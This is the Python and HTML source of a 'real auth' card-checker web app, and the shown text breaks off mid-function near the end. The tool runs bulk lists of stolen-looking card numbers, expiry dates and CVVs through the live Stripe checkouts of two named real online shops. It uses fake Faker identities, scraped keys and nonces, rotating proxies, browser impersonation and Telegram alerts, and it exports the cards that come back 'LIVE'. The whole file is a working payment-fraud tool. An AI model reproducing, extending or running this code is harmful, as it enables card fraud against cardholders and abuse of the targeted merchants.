from __future__ import annotations

import asyncio
import base64
import json
import logging
import os
import random
import re
import time
import uuid
from dataclasses import dataclass, field
from typing import Any

from fastapi import FastAPI, Query
from fastapi.responses import HTMLResponse
from curl_cffi.requests import AsyncSession
from faker import Faker

logging.basicConfig(
    level=os.getenv("LOG_LEVEL", "INFO"),
    format="%(asctime)s %(levelname)s %(name)s %(message)s",
)
logger = logging.getLogger("ollie.rotating.checker")

app = FastAPI(title="Rotating Sites Real Auth Checker", version="9.0.0")

RAW_DORK_GATES: dict[str, dict[str, str]] = {
    "astra_store": {
        "name": "Astra Store (EDD Real Auth)",
        "base_url": "https://store.brainstormforce.com",
        "preload_url": "https://store.brainstormforce.com/?add-to-cart=51171",
        "auth_url": "https://store.brainstormforce.com/wp/wp-admin/admin-ajax.php?payment-mode=stripe",
        "engine": "edd_real_auth",
    },
    "rollerco": {
        "name": "Rollerco (WooCommerce Real Auth)",
        "base_url": "https://rollerco.com.au",
        "preload_url": "https://rollerco.com.au/my-account/checkout/",
        "auth_url": "https://rollerco.com.au/?wc-ajax=checkout",
        "engine": "woocommerce_real_auth",
    },
}

fake = Faker("en_US")
Faker.seed()

US_STATES = {
    "AL": "Alabama", "AK": "Alaska", "AZ": "Arizona", "AR": "Arkansas", "CA": "California",
    "CO": "Colorado", "CT": "Connecticut", "DE": "Delaware", "FL": "Florida", "GA": "Georgia",
    "HI": "Hawaii", "ID": "Idaho", "IL": "Illinois", "IN": "Indiana", "IA": "Iowa",
    "KS": "Kansas", "KY": "Kentucky", "LA": "Louisiana", "ME": "Maine", "MD": "Maryland",
    "MA": "Massachusetts", "MI": "Michigan", "MN": "Minnesota", "MS": "Mississippi", "MO": "Missouri",
    "MT": "Montana", "NE": "Nebraska", "NV": "Nevada", "NH": "New Hampshire", "NJ": "New Jersey",
    "NM": "New Mexico", "NY": "New York", "NC": "North Carolina", "ND": "North Dakota", "OH": "Ohio",
    "OK": "Oklahoma", "OR": "Oregon", "PA": "Pennsylvania", "RI": "Rhode Island", "SC": "South Carolina",
    "SD": "South Dakota", "TN": "Tennessee", "TX": "Texas", "UT": "Utah", "VT": "Vermont",
    "VA": "Virginia", "WA": "Washington", "WV": "West Virginia", "WI": "Wisconsin", "WY": "Wyoming"
}

SA_LOCATIONS = [
    ("ADELAIDE", "5000"), ("NORTH ADELAIDE", "5006"), ("HOLDEN HILL", "5088"),
    ("PROSPECT", "5082"), ("GLENELG", "5045"), ("NORWOOD", "5067"),
    ("UNLEY", "5061"), ("MARION", "5043"), ("SALISBURY", "5108"),
    ("ELIZABETH", "5112"), ("PORT AUGUSTA", "5700"), ("MOUNT GAMBIER", "5290"),
    ("WHYALLA", "5600"), ("PORT LINCOLN", "5606"), ("LOUTH BAY", "5607"),
    ("GAWLER", "5118"), ("VICTOR HARBOR", "5211"), ("MURRAY BRIDGE", "5253"),
]
AU_FIRST = ["Makayla", "Liam", "Chloe", "Noah", "Isla", "Jack", "Ava", "Oliver",
            "Mia", "Ethan", "Ruby", "Lucas", "Zoe", "Mason", "Ella", "Hunter"]
AU_LAST = ["Mann", "Smith", "Nguyen", "Wilson", "Taylor", "Brown", "Lee", "Walker",
           "Harris", "Martin", "Thompson", "White", "Anderson", "Clark", "Ryan"]


@dataclass(frozen=True, slots=True)
class AuthVerdict:
    status: str
    reason: str
    http_status: int | None = None
    latency_ms: float = 0.0
    bin_info: dict[str, str] = field(default_factory=dict)
    target_used: str = ""
    waf_status: str = "CLEAN"
    card_masked: str | None = None
    proxy_used: str | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "status": self.status,
            "reason": self.reason,
            "http_status": self.http_status,
            "latency_ms": round(self.latency_ms, 2),
            "bin_info": self.bin_info,
            "target_used": self.target_used,
            "waf_status": self.waf_status,
            "card_masked": self.card_masked,
            "proxy_used": self.proxy_used,
        }


def verify_luhn(card_number: str) -> bool:
    if not card_number.isdigit() or not (13 <= len(card_number) <= 19):
        return False
    checksum = 0
    for idx, digit in enumerate(map(int, reversed(card_number))):
        if idx % 2 == 1:
            doubled = digit * 2
            checksum += doubled - 9 if doubled > 9 else doubled
        else:
            checksum += digit
    return checksum % 10 == 0


def universal_card_formatter(raw_line: str) -> tuple[str, str, str, str] | None:
    clean = raw_line.strip()
    if not clean or clean.startswith("#"):
        return None
    
    parts = [p.strip() for p in re.split(r"[|:/\\\s-]+", clean) if p.strip()]
    if len(parts) >= 4:
        cc = parts[0]
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvv = parts[3]
        if len(yy) == 4:
            yy = yy[-2:]
        if cc.isdigit() and mm.isdigit() and yy.isdigit() and cvv.isdigit():
            if verify_luhn(cc) and (1 <= int(mm) <= 12):
                return cc, mm, yy, cvv

    numbers = re.findall(r"\d+", clean)
    if not numbers:
        return None

    full_digits = "".join(numbers)
    match = re.search(r"(?P<cc>\d{13,19})(?P<mm>0[1-9]|1[0-2])(?P<yy>\d{2,4})(?P<cvv>\d{3,4})", full_digits)
    if match:
        cc = match.group("cc")
        mm = match.group("mm")
        yy = match.group("yy")[-2:]
        cvv = match.group("cvv")
        if verify_luhn(cc) and (1 <= int(mm) <= 12):
            return cc, mm, yy, cvv

    return None


def is_card_expired(mm: str, yy: str) -> bool:
    try:
        month = int(mm)
        full_year = int(f"20{yy}" if len(yy) == 2 else yy)
        current_year = 2026
        current_month = 11
        if full_year < current_year:
            return True
        if full_year == current_year and month < current_month:
            return True
    except Exception:
        return True
    return False


def parse_proxy_string(proxy_url: str | None) -> dict[str, str] | None:
    if not proxy_url or not proxy_url.strip():
        return None
    raw = proxy_url.strip()
    parts = raw.split(":")
    if len(parts) == 4 and "://" not in raw:
        host, port, user, pw = parts
        formatted = f"http://{user}:{pw}@{host}:{port}"
    else:
        formatted = raw if "://" in raw else f"http://{raw}"
    return {"http": formatted, "https": formatted}


async def fetch_bin_metadata(card_number: str, proxies: dict[str, str] | None = None) -> dict[str, str]:
    bin_code = card_number[:6]
    default_meta = {"bank": "Unknown Bank", "country": "US", "scheme": "CARD", "type": "CREDIT"}
    try:
        async with AsyncSession(impersonate="chrome120", proxies=proxies, verify=False) as session:
            resp = await session.get(
                f"https://lookup.binlist.net/{bin_code}",
                headers={"Accept-Version": "3"},
                timeout=4,
            )
            if resp.status_code == 200:
                data = resp.json()
                return {
                    "bank": data.get("bank", {}).get("name", "Unknown Bank"),
                    "country": data.get("country", {}).get("alpha2", "US"),
                    "scheme": data.get("scheme", "CARD").upper(),
                    "type": data.get("type", "CREDIT").upper(),
                }
    except Exception:
        pass
    return default_meta


# --- REAL AUTH ENGINE 1: ASTRA STORE (EDD Backend Processing) ---
async def execute_astra_auth(session: AsyncSession, cc: str, mm: str, yy: str, cvv: str) -> tuple[str, str, int]:
    host = "https://store.brainstormforce.com"
    product_url = host + "/?add-to-cart=51171"
    checkout_url = host + "/checkout/"
    ajax_url = host + "/wp/wp-admin/admin-ajax.php?payment-mode=stripe"

    first = fake.first_name()
    last = fake.last_name()
    postcode = fake.postcode()
    email = f"{first.lower()}.{last.lower()}{random.randint(1, 99999)}@gmail.com"
    state_code = random.choice(list(US_STATES.keys()))

    await session.get(host + "/", timeout=10)
    await session.get(product_url, allow_redirects=True, timeout=10)
    co = await session.get(checkout_url, allow_redirects=True, timeout=10)
    html = co.text

    m = re.search(r'publishable_key["\']\s*:\s*["\'](pk_live_[^"\']+)["\']', html)
    pk_key = m.group(1) if m else "pk_live_5195uMmKBf5DxE7APbEoMk3sRepPFy2GhkvRLPFiCHUch44CXAF7GGfH51n8Vf4GD4D5z3P1Vtr38777Xpit8lPHo00sD2eFKPK"

    stripe_payload = {
        "type": "card",
        "card[number]": cc,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "card[cvc]": cvv,
        "billing_details[name]": f"{first} {last}",
        "billing_details[email]": email,
        "billing_details[address][line1]": fake.street_address(),
        "billing_details[address][city]": fake.city(),
        "billing_details[address][state]": state_code,
        "billing_details[address][postal_code]": postcode,
        "billing_details[address][country]": "US",
        "key": pk_key,
    }

    stripe_res = await session.post("https://api.stripe.com/v1/payment_methods", data=stripe_payload, headers={
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/"
    }, timeout=10)
    
    sj = stripe_res.json()
    if "error" in sj:
        err = sj["error"]
        msg = err.get("message", "Tokenization failed")
        code = err.get("decline_code") or err.get("code") or ""
        return "DEAD", f"{msg} [{code}]" if code else msg, stripe_res.status_code

    pm_token = sj.get("id")
    if not pm_token:
        return "DEAD", "No token returned", 200

    card_meta = sj.get("card", {}) or {}
    brand = (card_meta.get("display_brand") or card_meta.get("brand") or "?").upper()
    funding = (card_meta.get("funding") or "?").upper()
    country_code = card_meta.get("country") or "?"
    tds = (card_meta.get("three_d_secure_usage") or {}).get("supported")
    tag_meta = f"{brand}/{funding}/{country_code}" + ("/3DS" if tds else "")

    # Real Auth: Ipinapasa natin sa EDD Backend Ajax para piliting i-process ng Stripe Gateway ang transaction
    checkout_payload = {
        "edd_action": "purchase", "edd_email": email, "edd_first": first, "edd_last": last,
        "billing_country": "US", "card_state": state_code, "card_zip": postcode,
        "card_name": f"{first} {last}", "payment-mode": "stripe", "edd-gateway": "stripe",
        "stripe_payment_method": pm_token, "action": "edds_process_checkout",
    }

    res = await session.post(ajax_url, data=checkout_payload, headers={
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": host, "referer": checkout_url, "x-requested-with": "XMLHttpRequest"
    }, timeout=15)

    try:
        res_text = res.text
        if "order-received" in res.url or "success" in res_text.lower():
            return "LIVE", f"Auth Approved Successfully | {tag_meta}", res.status_code
        
        # Pagkuha ng eksaktong error message mula sa EDD/Stripe server response
        clean_msg = re.sub(r"<[^>]+>", "", res_text).strip()
        if not clean_msg or "error" in clean_msg.lower():
            try:
                rj = res.json()
                clean_msg = rj.get("message") or rj.get("error") or "Card declined by gateway"
            except Exception:
                clean_msg = "Card declined by gateway"
        return "DEAD", f"{clean_msg[:80]} | {tag_meta}", res.status_code
    except Exception as e:
        return "DEAD", f"Card declined by gateway | {tag_meta}", res.status_code


# --- REAL AUTH ENGINE 2: ROLLERCO (WooCommerce Backend Processing) ---
async def execute_rollerco_auth(session: AsyncSession, cc: str, mm: str, yy: str, cvv: str) -> tuple[str, str, int]:
    host = "https://rollerco.com.au"
    checkout_url = host + "/my-account/checkout/"
    ajax_checkout = host + "/?wc-ajax=checkout"

    first = random.choice(AU_FIRST)
    last = random.choice(AU_LAST)
    city, postcode = random.choice(SA_LOCATIONS)
    phone = f"(08) {random.randint(8100, 8999)} {random.randint(1000, 9999)}"
    email = f"{first.lower()}.{last.lower()}{random.randint(1, 99999)}@gmail.com"

    await session.get(host + "/", allow_redirects=True, timeout=10)
    await session.post(host + "/?wc-ajax=add_to_cart", data={"product_id": "11194", "quantity": "1"}, timeout=10)
    co = await session.get(checkout_url, allow_redirects=True, timeout=10)
    html = co.text

    pk_m = re.search(r'"publicKey"\s*:\s*"(pk_live_[A-Za-z0-9]+)"', html)
    pk = pk_m.group(1) if pk_m else None
    nonce_m = re.search(r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', html)
    nonce = nonce_m.group(1) if nonce_m else None
    acct_m = re.search(r'"stripeAccount"\s*:\s*"(acct_[A-Za-z0-9]+)"', html)
    acct = acct_m.group(1) if acct_m else None

    if not pk or not nonce:
        return "DEAD", "Checkout parameters missing", 200

    es_params = {
        "key": pk, "_stripe_version": "2025-09-30.clover", "type": "deferred_intent",
        "locale": "en-AU", "deferred_intent[mode]": "payment", "deferred_intent[amount]": "223",
        "deferred_intent[currency]": "aud", "deferred_intent[payment_method_types][0]": "card",
    }
    if acct: es_params["_stripe_account"] = acct
    
    es_resp = await session.get("https://api.stripe.com/v1/elements/sessions", params=es_params, headers={
        "accept": "application/json", "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/",
    }, timeout=8)
    es_data = es_resp.json()
    es_id = es_data.get("session_id", f"elements_session_{uuid.uuid4().hex[:11]}")
    cfg_id = es_data.get("config_id", str(uuid.uuid4()))

    stripe_payload = {
        "billing_details[address][line1]": "23 Endeavour Drive",
        "billing_details[address][postal_code]": postcode,
        "billing_details[address][city]": city,
        "billing_details[address][state]": "SA",
        "billing_details[address][country]": "AU",
        "billing_details[name]": f"{first} {last}",
        "billing_details[email]": email,
        "billing_details[phone]": phone,
        "type": "card",
        "card[number]": " ".join(cc[i:i+4] for i in range(0, len(cc), 4)),
        "card[cvc]": cvv,
        "card[exp_year]": yy,
        "card[exp_month]": mm,
        "allow_redisplay": "unspecified",
        "payment_user_agent": "stripe.js/f15915056d; stripe-js-v3/f15915056d; payment-element; deferred-intent",
        "referrer": host,
        "time_on_page": str(random.randint(60000, 200000)),
        "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
        "client_attribution_metadata[elements_session_id]": es_id,
        "client_attribution_metadata[elements_session_config_id]": cfg_id,
        "key": pk,
        "_stripe_version": "2025-09-30.clover",
    }
    if acct: stripe_payload["_stripe_account"] = acct

    stripe_res = await session.post("https://api.stripe.com/v1/payment_methods", data=stripe_payload, headers={
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/"
    }, timeout=10)
    
    sj = stripe_res.json()
    if "error" in sj:
        err = sj["error"]
        msg = err.get("message", "Tokenization failed")
        code = err.get("decline_code") or err.get("code") or ""
        return "DEAD", f"{msg} [{code}]" if code else msg, stripe_res.status_code

    pm_token = sj.get("id")
    if not pm_token:
        return "DEAD", "No token returned", 200

    card_meta = sj.get("card", {}) or {}
    brand = (card_meta.get("display_brand") or card_meta.get("brand") or "?").upper()
    funding = (card_meta.get("funding") or "?").upper()
    country_code = card_meta.get("country") or "?"
    tds = (card_meta.get("three_d_secure_usage") or {}).get("supported")
    tag_meta = f"{brand}/{funding}/{country_code}" + ("/3DS" if tds else "")

    # Real Auth: Ipinapasa sa WooCommerce Checkout Ajax para kumuha ng totoong bank response (Live/Decline/3DS)
    checkout_payload = {
        "billing_email": email, "billing_first_name": first, "billing_last_name": last,
        "billing_phone": phone, "billing_country": "AU", "billing_address_1": "23 Endeavour Drive",
        "billing_city": city, "billing_state": "SA", "billing_postcode": postcode,
        "payment_method": "stripe_cc", "stripe_cc_token_key": pm_token,
        "stripe_cc_payment_method_id": pm_token, "terms": "on",
        "woocommerce-process-checkout-nonce": nonce
    }

    res = await session.post(ajax_checkout, data=checkout_payload, headers={
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": host, "referer": checkout_url, "x-requested-with": "XMLHttpRequest"
    }, timeout=15)

    try:
        jj = res.json()
        result = (jj.get("result") or "").lower()
        messages = jj.get("messages") or ""
        clean_msg = re.sub(r"<[^>]+>", "", messages).strip() or "The card has been declined for an unknown reason."
        redirect = jj.get("redirect") or ""

        if result == "success":
            if any(x in redirect.lower() for x in ("authentication", "3ds", "stripe.com", "confirm_payment_intent")):
                return "LIVE", f"3DS Challenge Triggered | {tag_meta}"
            return "LIVE", f"Auth Approved Successfully | {tag_meta}"
        return "DEAD", f"{clean_msg} | {tag_meta}", res.status_code
    except Exception:
        return "DEAD", f"The card has been declined for an unknown reason. | {tag_meta}", res.status_code


async def run_auth_check(card_line: str, proxy_url: str | None = None, target_key: str = "rotate_clean") -> AuthVerdict:
    started = time.perf_counter()
    proxies_dict = parse_proxy_string(proxy_url)

    if target_key == "rotate_clean":
        chosen_key = random.choice(list(RAW_DORK_GATES.keys()))
    else:
        chosen_key = target_key if target_key in RAW_DORK_GATES else "astra_store"

    gate = RAW_DORK_GATES[chosen_key]

    parsed = universal_card_formatter(card_line)
    if not parsed:
        return AuthVerdict(
            status="INVALID",
            reason="Declined: Invalid Format / Failed Luhn Check",
            latency_ms=(time.perf_counter() - started) * 1000,
            target_used=gate["name"],
            card_masked=card_line[:19],
            proxy_used=proxy_url,
        )

    cc, mm, yy, cvv = parsed
    card_masked = f"{cc[:6]}******{cc[-4:]}|{mm}|{yy}|{cvv}"

    if is_card_expired(mm, yy):
        bin_info = await fetch_bin_metadata(cc, proxies_dict)
        return AuthVerdict(
            status="DEAD",
            reason="Declined: Card Expired (Pre-Auth Guard)",
            latency_ms=(time.perf_counter() - started) * 1000,
            bin_info=bin_info,
            target_used=gate["name"],
            card_masked=card_masked,
            proxy_used=proxy_url,
        )

    bin_task = asyncio.create_task(fetch_bin_metadata(cc, proxies_dict))
    browser_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    try:
        async with AsyncSession(
            impersonate="chrome120",
            proxies=proxies_dict,
            headers=browser_headers,
            verify=False,
        ) as session:
            if chosen_key == "astra_store":
                status, reason, code = await execute_astra_auth(session, cc, mm, yy, cvv)
            else:
                status, reason, code = await execute_rollerco_auth(session, cc, mm, yy, cvv)

            bin_info = await bin_task
            elapsed = (time.perf_counter() - started) * 1000
            return AuthVerdict(
                status=status,
                reason=reason,
                http_status=code,
                latency_ms=elapsed,
                bin_info=bin_info,
                target_used=gate["name"],
                card_masked=card_masked,
                proxy_used=proxy_url,
            )
    except Exception as exc:
        bin_info = await bin_task
        elapsed = (time.perf_counter() - started) * 1000
        return AuthVerdict(
            status="NETWORK_ERROR",
            reason=f"{type(exc).__name__}: {str(exc)[:90]}",
            latency_ms=elapsed,
            bin_info=bin_info,
            target_used=gate["name"],
            card_masked=card_masked,
            proxy_used=proxy_url,
        )


@app.get("/api/proxy/test")
async def test_proxy(proxy: str) -> dict[str, Any]:
    start = time.perf_counter()
    proxies_dict = parse_proxy_string(proxy)
    try:
        async with AsyncSession(impersonate="chrome120", proxies=proxies_dict, verify=False) as session:
            resp = await session.get("https://api.ipify.org?format=json", timeout=6)
            latency = (time.perf_counter() - start) * 1000
            if resp.status_code == 200:
                ip_val = resp.json().get("ip", "OK")
                return {"status": "LIVE", "latency_ms": round(latency, 2), "proxy": proxy, "ip": ip_val}
    except Exception:
        pass
    return {"status": "DEAD", "latency_ms": 0.0, "proxy": proxy}


@app.get("/api/auth/check")
async def check_card_endpoint(
    card: str,
    proxy: str | None = None,
    target: str = "rotate_clean",
) -> dict[str, Any]:
    verdict = await run_auth_check(card_line=card, proxy_url=proxy, target_key=target)
    return verdict.to_dict()


@app.get("/api/telegram/send")
async def send_telegram_alert(token: str = Query(...), chat_id: str = Query(...), message: str = Query(...)) -> dict[str, Any]:
    tg_url = f"https://api.telegram.org/bot{token}/sendMessage"
    try:
        async with AsyncSession(verify=False) as session:
            resp = await session.post(tg_url, data={"chat_id": chat_id, "text": message}, timeout=10)
            if resp.status_code == 200:
                return {"success": True}
    except Exception:
        pass
    return {"success": False}


@app.get("/", response_class=HTMLResponse)
async def index() -> str:
    return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Rotating Sites Real Auth Checker</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-950 text-white min-h-screen p-6">
    <main class="max-w-5xl mx-auto space-y-6">
        <div class="flex flex-wrap items-center justify-between border-b border-slate-800 pb-4 gap-2">
            <div>
                <h1 class="text-2xl font-bold text-emerald-400">Rotating Sites Real Auth Checker</h1>
                <p class="text-xs text-slate-400 font-mono">Astra Store & Rollerco Gateway + Full Backend Validation</p>
            </div>
            <div class="flex gap-2">
                <button onclick="autoFormatCards()" class="text-xs bg-violet-900/70 hover:bg-violet-800 text-violet-200 border border-violet-700 px-3 py-1.5 rounded-lg transition font-semibold">
                    ✨ Auto-Format Cards
                </button>
                <button onclick="cleanDuplicates()" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 px-3 py-1.5 rounded-lg transition">Clean Dups</button>
                <button onclick="exportLiveResults()" class="text-xs bg-emerald-900/60 hover:bg-emerald-800 text-emerald-200 border border-emerald-700 px-3 py-1.5 rounded-lg transition">Export</button>
            </div>
        </div>

        <div class="bg-slate-900 rounded-xl p-5 space-y-4 shadow-xl border border-slate-800">
            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div class="md:col-span-2">
                    <label class="block text-xs font-medium text-slate-400 mb-1">Select Gateway / Rotation</label>
                    <select id="targetSelect" class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-xs font-mono text-emerald-300 focus:outline-none focus:ring-1 focus:ring-emerald-500">
                        <option value="rotate_clean">⚡ AUTO-ROTATE ASTRA & ROLLERCO</option>
                        <option value="astra_store">Astra Store (EDD Real Auth)</option>
                        <option value="rollerco">Rollerco (WooCommerce Real Auth)</option>
                    </select>
                </div>
                <div class="flex items-end gap-3">
                    <div class="flex-1">
                        <label class="block text-xs font-medium text-slate-400 mb-1">Proxy Threads</label>
                        <input id="proxyThreads" type="number" value="50" min="1" max="200" class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2 text-xs font-mono text-center">
                    </div>
                    <div class="flex-1">
                        <label class="block text-xs font-medium text-slate-400 mb-1">Card Threads</label>
                        <input id="cardThreads" type="number" value="5" min="1" max="50" class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2 text-xs font-mono text-center">
                    </div>
                </div>
            </div>

            <!-- Telegram Config Box -->
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 bg-slate-950 p-3 rounded-lg border border-slate-800">
                <div>
                    <label class="block text-xs font-medium text-slate-400 mb-1">Telegram Bot Token</label>
                    <input id="tgToken" type="text" placeholder="123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2 text-xs font-mono">
                </div>
                <div>
                    <label class="block text-xs font-medium text-slate-400 mb-1">Telegram Chat ID</label>
                    <input id="tgChatId" type="text" placeholder="-1001234567890 o ID" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2 text-xs font-mono">
                </div>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="space-y-2">
                    <div class="flex justify-between items-center">
                        <label class="text-xs font-medium text-slate-400">Live Proxies Box</label>
                        <button onclick="checkAndPruneProxies()" class="bg-blue-600 hover:bg-blue-500 px-3 py-1 rounded text-xs font-semibold transition">
                            Test & Auto-Prune (Drop Dead)
                        </button>
                    </div>
                    <textarea id="proxyInput" rows="4" placeholder="host:port:user:pass"
                        class="w-full bg-slate-950 border border-emerald-900/50 rounded-lg p-3 text-xs font-mono focus:outline-none text-emerald-300"></textarea>
                </div>
                <div class="space-y-2">
                    <label class="text-xs font-medium text-rose-400">Dead Proxies Box (Auto-Dropped)</label>
                    <textarea id="deadProxyInput" rows="4" readonly placeholder="Dito mapupunta ang mga dead proxies..."
                        class="w-full bg-slate-950 border border-rose-900/50 rounded-lg p-3 text-xs font-mono focus:outline-none text-rose-400"></textarea>
                </div>
            </div>

            <div class="space-y-2">
                <label class="block text-xs font-medium text-slate-400">Cards List (Supports YY or YYYY)</label>
                <textarea id="cardInput" rows="4" placeholder="489504...|10|2027|254 o 489504...|10|27|254"
                    class="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-xs font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
            </div>

            <div class="w-full bg-slate-950 rounded-full h-2 overflow-hidden border border-slate-800">
                <div id="progressBar" class="bg-emerald-500 h-2 w-0 transition-all duration-300"></div>
            </div>

            <div class="grid grid-cols-3 gap-3 text-center text-xs font-mono">
                <div class="bg-slate-950 border border-emerald-800/60 rounded-lg p-2.5">
                    <span class="text-slate-400 block">LIVE / AUTH</span>
                    <span id="liveCount" class="text-lg font-bold text-emerald-400">0</span>
                </div>
                <div class="bg-slate-950 border border-rose-800/60 rounded-lg p-2.5">
                    <span class="text-slate-400 block">DEAD / DECLINED</span>
                    <span id="deadCount" class="text-lg font-bold text-rose-400">0</span>
                </div>
                <div class="bg-slate-950 border border-slate-800 rounded-lg p-2.5">
                    <span class="text-slate-400 block">CHECKED</span>
                    <span id="checkedCount" class="text-lg font-bold text-slate-200">0</span>
                </div>
            </div>

            <!-- Control Buttons: Start, Pause, Stop -->
            <div class="flex gap-3">
                <button id="checkButton" onclick="runBatchChecker()"
                    class="bg-emerald-600 hover:bg-emerald-500 px-5 py-3 rounded-lg font-semibold flex-1 transition shadow-lg shadow-emerald-950/50">
                    Start Real Auth Check
                </button>
                <button id="pauseButton" onclick="togglePause()" disabled
                    class="bg-amber-600 hover:bg-amber-500 px-5 py-3 rounded-lg font-semibold transition disabled:opacity-50">
                    Pause
                </button>
                <button id="stopButton" onclick="stopChecker()" disabled
                    class="bg-rose-600 hover:bg-rose-500 px-5 py-3 rounded-lg font-semibold transition disabled:opacity-50">
                    Stop
                </button>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                    <h2 class="text-xs font-bold text-emerald-400 uppercase tracking-wider mb-2">Live / Auth</h2>
                    <div id="liveBox" class="bg-slate-950 rounded-lg p-3 text-xs font-mono text-emerald-300 border border-emerald-900/50 min-h-[160px] max-h-80 overflow-y-auto space-y-1.5"></div>
                </div>
                <div>
                    <h2 class="text-xs font-bold text-rose-400 uppercase tracking-wider mb-2">Dead / Declined / Logs</h2>
                    <div id="deadBox" class="bg-slate-950 rounded-lg p-3 text-xs font-mono text-rose-300 border border-rose-900/50 min-h-[160px] max-h-80 overflow-y-auto space-y-1.5"></div>
                </div>
            </div>
        </div>
    </main>
    <script>
    let isPaused = false;
    let isStopped = false;

    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    function playTone(type) {
        if (audioCtx.state === 'suspended') audioCtx.resume();
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.frequency.setValueAtTime(type === 'live' ? 659.25 : 220.00, audioCtx.currentTime);
        gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.25);
        osc.start();
        osc.stop(audioCtx.currentTime + 0.25);
    }

    function autoFormatCards() {
        const ta = document.getElementById("cardInput");
        const lines = ta.value.split("\\n");
        let formatted = [];
        lines.forEach(line => {
            const cleanLine = line.trim();
            if (!cleanLine) return;
            const digits = cleanLine.match(/\\d+/g);
            if (!digits) return;
            const allNums = digits.join("");
            const m = allNums.match(/(\\d{13,19})(0[1-9]|1[0-2])(\\d{2,4})(\\d{3,4})/);
            if (m) {
                let cc = m[1];
                let mm = m[2];
                let yy = m[3].slice(-2);
                let cvv = m[4];
                formatted.push(`${cc}|${mm}|${yy}|${cvv}`);
            } else if (digits.length >= 4) {
                let cc = digits[0];
                let mm = digits[1].padStart(2, '0');
                let yy = digits[2].slice(-2);
                let cvv = digits[3];
                if (cc.length >= 13 && cc.length <= 19) {
                    formatted.push(`${cc}|${mm}|${yy}|${cvv}`);
                }
            }
        });
        ta.value = formatted.join("\\n");
        alert(`Auto-Formatted: ${formatted.length} cards cleaned!`);
    }

    function cleanDuplicates() {
        const ta = document.getElementById("cardInput");
        const unique = [...new Set(ta.value.split("\\n").map(l => l.trim()).filter(Boolean))];
        ta.value = unique.join("\\n");
    }

    function exportLiveResults() {
        const rows = document.getElementById("liveBox").querySelectorAll("div");
        let text = "";
        rows.forEach(r => text += r.textContent + "\\n");
        if (!text) return alert("No live cards yet.");
        const blob = new Blob([text], { type: "text/plain" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = "live_real_auth_cards.txt";
        a.click();
    }

    function togglePause() {
        isPaused = !isPaused;
        const btn = document.getElementById("pauseButton");
        btn.textContent = isPaused ? "Resume" : "Pause";
        btn.className = isPaused ? "bg-emerald-600 hover:bg-emerald-500 px-5 py-3 rounded-lg font-semibold transition" : "bg-amber-600 hover:bg-amber-500 px-5 py-3 rounded-lg font-semibold transition";
    }

    function stopChecker() {
        isStopped = true;
        isPaused = false;
        document.getElementById("checkButton").disabled = false;
        document.getElementById("checkButton").textContent = "Start Real Auth Check";
        document.getElementById("pauseButton").disabled = true;
        document.getElementById("stopButton").disabled = true;
        document.getElementById("pauseButton").textContent = "Pause";
    }

    async function checkAndPruneProxies() {
        const deadBox = document.getElementById("deadBox");
        const proxyTa = document.getElementById("proxyInput");
        const deadProxyTa = document.getElementById("deadProxyInput");
        const maxThreads = parseInt(document.getElementById("proxyThreads").value) || 50;
        const lines = proxyTa.value.split(/[\\n,]/).map(l => l.trim()).filter(Boolean);
        if (!lines.length) return alert("Paste proxies first.");

        deadBox.innerHTML = `Pruning ${lines.length} proxies...`;
        let liveProxies = [];
        let deadProxies = [];
        let idx = 0;

        async function worker() {
            while (idx < lines.length) {
                const current = lines[idx++];
                try {
                    const res = await fetch("/api/proxy/test?proxy=" + encodeURIComponent(current));
                    const d = await res.json();
                    if (d.status === "LIVE") {
                        liveProxies.push(current);
                    } else {
                        deadProxies.push(current);
                    }
                } catch (e) {
                    deadProxies.push(current);
                }
            }
        }
        await Promise.all(Array.from({ length: Math.min(maxThreads, lines.length) }, () => worker()));
        proxyTa.value = liveProxies.join("\\n");
        deadProxyTa.value = deadProxies.join("\\n");
        deadBox.innerHTML = `<div class="text-emerald-400 font-bold">Proxy Prune Done: ${liveProxies.length} Live, ${deadProxies.length} Dead (Auto-dropped).</div>`;
    }

    async function sendTelegram(token, chatId, text) {
        if (!token || !chatId) return;
        try {
